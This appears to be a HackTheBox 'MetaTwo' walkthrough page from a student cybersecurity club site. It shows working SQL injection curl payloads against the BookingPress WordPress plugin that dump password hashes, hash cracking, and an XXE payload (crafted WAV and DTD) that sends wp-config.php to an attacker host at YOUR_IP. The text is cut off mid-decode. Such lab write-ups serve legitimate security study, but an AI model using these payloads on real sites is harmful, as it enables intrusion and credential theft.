@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html>
+<div id="particles-js">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!--  Essential META Tags -->
+<meta property="og:title" content="MetaTwo HackTheBox Writeup">
+<meta name="description" content="MetaTwo HackTheBox Writeup">
+<meta property="og:type" content="article" />
+<meta property="og:image" content="/images/HTB/MetaTwo/MetaTwo.png">
+<!-- <meta property="og:url" content="https://0xv01d.github.io/hackthebox/trick"> -->
+<meta name="twitter:card" content="/images/HTB/MetaTwo/MetaTwo.png">
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script src="/Scripts/js/particles.js"></script>
+<script src="/Scripts/js/app.js"></script>
+
+<title>MetaTwo HTB Writeup</title>
+<meta property="og:locale" content="en_US">
+<script type="application/ld+json"></script>
+
+<link rel="stylesheet" href="/Styles/style.css?v=">
+<link rel="stylesheet" href="/Styles/highlight_monokai.css">
+<!-- Setup Google Analytics -->
+<link rel="shortcut icon" type="image/x-icon" href="/images/HTB/MetaTwo/favicon.ico">
+
+<!--Information SideBar-->
+        <header class="app-header">
+            <a href="https:gaberoy01.github.io">
+                <img class="avatar" src="/images/index/avatar.png">
+            </a>
+            <p></p>
+            <h1><strong>Gabe's Writeups</strong></h1>
+            <nav class="app-header-menu">
+                <a class="app-header-menu-item" href="/">Home</a>
+                -
+                <a class="app-header-menu-item" href="#">Tags</a>
+                -
+                <a class="app-header-menu-item" href="#">About</a>
+            </nav>
+            <p>Bradley University Cybersecurity Club</p>
+            <!--Contact me-->
+            <div class="app-header-media">
+                <a class="fab fa-github-square" href="https://github.com/GabeRoy01" rel="noreferrer noopener"
+                    target="_blank"><img src="/images/index/github.png"></a>
+                <<!-- a class="fab fa-envelope-square" href="mailto:im_0xv01d@outlook.com" rel="noreferrer noopener"
+                    target="_blank"><img src="/images/index/email.png"></img></a> -->
+                    <!-- <a href="https://discord.com/users/504974900239400961" class="fab fa-discord" rel="noreferrer noopener" target="_blank"></a> -->
+                    <!-- <a class="fab fa-twitter-square" href="https://twitter.com/0xEr3bus" rel="noreferrer noopener" target="_blank"></a> -->
+            </div>
+            <a href="https://app.hackthebox.com/profile/682451" rel="noreferrer noopener" target="_blank">
+                <img src="http://www.hackthebox.eu/badge/image/682451" alt="Hack The Box">
+            </a>
+            <div style="height: 7rem;"></div>
+        </header>
+
+        <main class="app-container">
+
+
+            <!--Machine Title-->
+            <div class="title">MetaTwo Walkthrough</div>
+            <!--Skill Tags-->
+            <div class="tag-skills">
+                <svg class="icon icon-tag svg-tag" fill="none" height="24" stroke="currentColor" stroke-linecap="round"
+                    stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="24"
+                    xmlns="http://www.w3.org/2000/svg">
+                    <title>tag</title>
+                    <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path>
+                    <line x1="7" x2="7.01" y1="7" y2="7"></line>
+                </svg>
+                <a class="tag" href="#">XXE</a>
+                <a class="tag" href="#">SSTi</a>
+                <a class="tag" href="#">Web</a>
+            </div>
+
+            </header>
+
+<!--Machine Card-->
+<div><img class="machine-card" style="max-width: 594px;" src="/images/HTB/MetaTwo/MetaTwo.png"></img></div>
+
+
+<p>Begin with an NMap Scan:</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+    <pre class="highlight">
+        <code>
+<span class="na">$</span><span class="ld"><span class="kt"> nmap </span>-sC -sV 10.129.66.181
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-31 17:26 EDT
+Nmap scan report for 10.129.66.181
+Host is up (0.046s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp?
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
+|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
+|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+|_http-title: Did not follow redirect to http://metapress.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 229.01 seconds
+</span>
+</code></pre></div></div>
+
+<p>We see that <span style="color:rgb(255, 0, 234);">http://metapress.htb</span> is a redirect for port 80, so let's add it to our `/etc/hosts` file and go to the site:</p>
+
+<p>Be sure to add this to your hosts file</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>
+<span class="kt">In your /etc/hosts file </span>
+<span class="ld">
+10.129.66.181   metapress.htb
+</span></code></pre></div></div>
+
+
+
+<p class="head-img">Let's go take a look at the site:</p>
+
+<img class="img-post" style="max-width: 900px;"
+src="/images/HTB/MetaTwo/metapress1.png"></img>
+
+
+<p>We can use `whatweb` to look at the current web apps running on the site:</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>
+<span class="na">$</span><span class="ld"><span class="kt"> whatweb </span>http://metapress.htb
+
+http://metapress.htb [200 OK] Cookies[PHPSESSID],
+Country[RESERVED][ZZ],HTML5, HTTPServer[nginx/1.18.0], 
+IP[10.129.66.181], MetaGenerator[WordPress 5.6.2], 
+PHP[8.0.24], PoweredBy[--], Script, 
+Title[MetaPress &#8211; Official company site], 
+UncommonHeaders[link], WordPress[5.6.2], 
+X-Powered-By[PHP/8.0.24], nginx[1.18.0]
+</span>
+</code></pre></div></div>
+
+<p>We see that it is running WordPress 5.6.2, so let's look at SearchSploit and so some googling:</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>
+<span class="na">$</span><span class="ld"><span class="kt"> searchsploit </span>wordpress 5.6.2
+
+--------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                       |  Path
+--------------------------------------------------------------------- ---------------------------------
+WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities  | php/webapps/39553.txt
+WordPress Plugin iThemes Security < 7.0.3 - SQL Injection            | php/webapps/44943.txt
+WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection          | php/webapps/48918.sh
+--------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</span>
+</code></pre></div></div>
+
+<p>I looked at the site and navigated to the <span style="color:rgb(255, 0, 234);">/events</span> page and decided to inspect element to look for a plugin to exploit. We see in the <span style="color:rgb(255, 0, 234);">/wp-content</span> folder a plugin called <span style="color:rgb(255, 0, 234);">bookingpress:</span></p>
+
+<img class="img-post" style="max-width: 500px;"
+src="/images/HTB/MetaTwo/metapress2.png"></img>
+
+<p>We see it is running version 1.0.10. By doing a bit of research you can find an exploit and description here on <a href="https://vulners.com/wpexploit/WPEX-ID:388CD42D-B61A-42A4-8604-99B812DB2357" rel="noreferrer noopener"target="_blank">Vulners.</p>
+</a>
+
+<p>To summarize, the plugin doesn't sanitize our POST data when we send it over. Once received, the plugin uses it in a dynamically structured SQL query. This combination leads to unauthenticated SQL injection.</p>
+
+<p class="head-img">Let's try it out. We will need:
+    <br>&rarr; A nonce value, which we can get by creating a valid event with the plugin.
+    <br>&rarr; Then, you can capture that event creation in <span style="color:rgb(255, 0, 234);">Burp Suite</span> to get the value of that nonce.
+</p>
+
+<p>Event Creation:</p>
+<img class="img-post" style="max-width: 900px;"
+src="/images/HTB/MetaTwo/metapress3.png"></img>
+
+<p>Getting the nonce from <span style="color:rgb(255, 0, 234);">Burp Suite</span>:</p>
+<img class="img-post" style="max-width: 900px;"
+src="/images/HTB/MetaTwo/metapress4.png"></img>
+
+<p>We can then use the payload from vulners and our nonce to see if we can exploit the vulnerability:</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>
+<span class="na">$</span><span class="ld"><span class="kt"> curl </span> -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=acbffbb9d9&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
+
+HTTP/1.1 200 OK
+Server: nginx/1.18.0
+Date: Wed, 04 Jan 2023 04:59:07 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/8.0.24
+X-Robots-Tag: noindex
+X-Content-Type-Options: nosniff
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+X-Frame-Options: SAMEORIGIN
+Referrer-Policy: strict-origin-when-cross-origin
+
+[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
+</span>
+</code></pre></div></div>
+
+<p>The output shows us some information about the machine, verifying the presence of the vulnerability. Let's modify our payload a little bit:</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>
+<span class="na">$</span><span class="ld"><span class="kt"> curl </span> -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=acbffbb9d9&category_id=33&total_service=-7502) union select database(),1,1,1,1,1,1,1,1-- -'
+
+HTTP/1.1 200 OK
+Server: nginx/1.18.0
+Date: Wed, 04 Jan 2023 05:00:52 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/8.0.24
+X-Robots-Tag: noindex
+X-Content-Type-Options: nosniff
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+X-Frame-Options: SAMEORIGIN
+Referrer-Policy: strict-origin-when-cross-origin
+
+[{"bookingpress_service_id":"blog","bookingpress_category_id":"1","bookingpress_service_name":"1","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"1","bookingpress_service_duration_unit":"1","bookingpress_service_description":"1","bookingpress_service_position":"1","bookingpress_servicedate_created":"1","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}] 
+</span>
+</code></pre></div></div>
+
+<p>We see that there is a database called <span style="color:rgb(255, 0, 234);">blog</span>, let's start digging. We can use <span style="color:rgb(255, 0, 234);">tr</span> to make our output a bit more readable.</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>
+<span class="na">$</span><span class="ld"><span class="kt"> curl </span> -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=acbffbb9d9&category_id=33&total_service=-7502) union select group_concat(table_name),1,1,1,1,1,1,1,1 from information_schema.tables where table_schema = database()-- -' | tr "," "\n"
+
+HTTP/1.1 200 OK
+Server: nginx/1.18.0
+Date: Wed
+ 04 Jan 2023 05:07:21 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/8.0.24
+X-Robots-Tag: noindex
+X-Content-Type-Options: nosniff
+Expires: Wed
+ 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache
+ must-revalidate
+ max-age=0
+X-Frame-Options: SAMEORIGIN
+Referrer-Policy: strict-origin-when-cross-origin
+
+[{"bookingpress_service_id":"wp_options
+wp_term_taxonomy
+wp_bookingpress_servicesmeta
+wp_commentmeta
+<span class="k">wp_users</span>
+wp_bookingpress_customers_meta
+wp_bookingpress_settings
+wp_bookingpress_appointment_bookings
+wp_bookingpress_customize_settings
+wp_bookingpress_debug_payment_log
+wp_bookingpress_services
+wp_termmeta
+wp_links
+wp_bookingpress_entries
+wp_bookingpress_categories
+wp_bookingpress_customers
+wp_bookingpress_notifications
+wp_usermeta
+wp_terms
+wp_bookingpress_default_daysoff
+wp_comments
+wp_bookingpress_default_workhours
+wp_postmeta
+wp_bookingpress_form_fields
+wp_bookingpress_payment_logs
+wp_posts
+wp_term_relationships"
+"bookingpress_category_id":"1"
+"bookingpress_service_name":"1"
+"bookingpress_service_price":"$1.00"
+"bookingpress_service_duration_val":"1"
+"bookingpress_service_duration_unit":"1"
+"bookingpress_service_description":"1"
+"bookingpress_service_position":"1"
+"bookingpress_servicedate_created":"1"
+"service_price_without_currency":1
+"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
+</span>
+</code></pre></div></div>
+
+<p>Let's look at the columns in the <span style="color:rgb(255, 0, 234);">wp_users</span> table: </p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>
+<span class="na">$</span><span class="ld"><span class="kt"> curl </span> -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=acbffbb9d9&category_id=33&total_service=-7502) union select group_concat(column_name),1,1,1,1,1,1,1,1 from information_schema.columns where table_schema = database() and table_name=0x77705f7573657273-- -' | tr "," "\n"
+
+HTTP/1.1 200 OK
+Server: nginx/1.18.0
+Date: Wed
+ 04 Jan 2023 05:12:48 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/8.0.24
+X-Robots-Tag: noindex
+X-Content-Type-Options: nosniff
+Expires: Wed
+ 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache
+ must-revalidate
+ max-age=0
+X-Frame-Options: SAMEORIGIN
+Referrer-Policy: strict-origin-when-cross-origin
+
+[{"bookingpress_service_id":"ID
+<span class="k">user_login</span>
+<span class="k">user_pass</span>
+user_nicename
+user_email
+user_url
+user_registered
+user_activation_key
+user_status
+display_name"
+"bookingpress_category_id":"1"
+"bookingpress_service_name":"1"
+"bookingpress_service_price":"$1.00"
+"bookingpress_service_duration_val":"1"
+"bookingpress_service_duration_unit":"1"
+"bookingpress_service_description":"1"
+"bookingpress_service_position":"1"
+"bookingpress_servicedate_created":"1"
+"service_price_without_currency":1
+"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
+</span>
+</code></pre></div></div>
+
+<p>Now we ought to try and read whats in those user and pass rows.</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>
+<span class="na">$</span><span class="ld"><span class="kt"> curl </span> -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=acbffbb9d9&category_id=33&total_service=-7502) union select group_concat(user_login,user_pass),1,1,1,1,1,1,1,1 from wp_users-- -' | tr "," "\n"
+
+HTTP/1.1 200 OK
+Server: nginx/1.18.0
+Date: Wed
+ 04 Jan 2023 05:16:17 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/8.0.24
+X-Robots-Tag: noindex
+X-Content-Type-Options: nosniff
+Expires: Wed
+ 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache
+ must-revalidate
+ max-age=0
+X-Frame-Options: SAMEORIGIN
+Referrer-Policy: strict-origin-when-cross-origin
+
+[{"bookingpress_service_id":<span class="k">"admin$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
+manager$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70"</span>
+"bookingpress_category_id":"1"
+"bookingpress_service_name":"1"
+"bookingpress_service_price":"$1.00"
+"bookingpress_service_duration_val":"1"
+"bookingpress_service_duration_unit":"1"
+"bookingpress_service_description":"1"
+"bookingpress_service_position":"1"
+"bookingpress_servicedate_created":"1"
+"service_price_without_currency":1
+"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
+</span>
+</code></pre></div></div>
+
+<p>Looks like we got a few hashes and usernames. Let's try and crack them with hashcat:</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>
+<span class="na">$</span><span class="ld"><span class="kt"> hashcat </span>-m 400 -a 0 hash.txt rockyou.txt
+
+- - - - SNIP - - - -
+
+$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:<span class="k">partylikearockstar</span>
+</span>
+</code></pre></div></div>
+
+<p>We can use this password to log into the wordpress dashboard as the <span style="color:rgb(255, 0, 234);">manager</span> user:</p>
+
+<img class="img-post" style="max-width: 900px;"
+src="/images/HTB/MetaTwo/metapress5.png"></img>
+
+<p>After doing some research on the wordpress version we found in the beginning, you'll find that this version is vulnerable to CVE-2021-29447. You could have also found this out from running WPScan. Here are some resources that make this exploit and XXE in general easier to follow:
+    <br>&rarr;<a href="https://www.youtube.com/watch?v=gjm6VHZa_8s&t=833s"rel="noreferrer noopener"target="_blank"> XXE - PwnFunction & John Hammond</a>
+    <br>&rarr;<a href="https://tryhackme.com/room/wordpresscve202129447"rel="noreferrer noopener"target="_blank"> TryHackMe - Wordpress: CVE-2021-29447</a>
+</p>
+
+<p>So, first you make your <span style="color:rgb(255, 0, 234);">payload.wav</span> file:</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>
+<span class="na">$</span><span class="ld"><span class="kt"> echo </span>-en 'RIFF\x85\x00\x00\x00WAVEiXML\x79\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOUR_IP/poc.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
+</span>
+</code></pre></div></div>
+
+<p>Then, you make your <span style="color:rgb(255, 0, 234);">payload.dtd</span> file:</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>
+<span class="na">$</span><span class="ld"><span class="kt"> cat </span>poc.dtd
+&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hostname"&gt;
+&lt;!ENTITY % init "&lt;!ENTITY &#x25; trick SYSTEM 'http://YOUR_IP/?p=%file;'&gt;" &gt;
+</span>
+</code></pre></div></div>
+
+<p>Open a python server on port 80 with these two files in the same directory then upload our <span style="color:rgb(255, 0, 234);">payload.wav</span> file:</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>
+<span class="na">$</span><span class="ld"><span class="kt"> python3 </span>-m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.186 - - "GET /payload.dtd HTTP/1.1" 200 -
+10.10.11.186 - - "GET /?p=<span class="k">bWV0YTIK</span> HTTP/1.1" 200 -
+</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>
+<span class="na">$</span><span class="ld"><span class="kt"> echo </span>"bWV0YTIK" | base64 -d
+meta2
+</span>
+</code></pre></div></div>
+
+<p>We see in the reply a base64 encoded version of <span style="color:rgb(255, 0, 234);">/etc/hostname</span>, so now we can just switch that part with the <span style="color:rgb(255, 0, 234);">../wp-config.php</span> file to see what it holds:</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>
+<span class="na">$</span><span class="ld"><span class="kt"> cat </span>payload.dtd
+&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=<span class="k">../wp-config.php"</span>&gt;
+&lt;!ENTITY % init "&lt;!ENTITY &#x25; trick SYSTEM 'http://YOUR_IP/?p=%file;'&gt;" &gt;
+</span>
+</code></pre></div></div>
+
+<p>Your response will be the base64 encoded version of the php file:</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>
+<span class="na">$</span><span class="ld"><span class="kt"> python3 </span>-m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.186 - - "GET /payload.dtd HTTP/1.1" 200 -
+10.10.11.186 - - "GET /?p=PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg== HTTP/1.1" 200 -
+</span>
+</code></pre></div></div>
+
+<p>Decoding this file reveals the following:</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>
+<span class="na">$</span><span class="ld"><span class="kt"> echo </span>"PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeG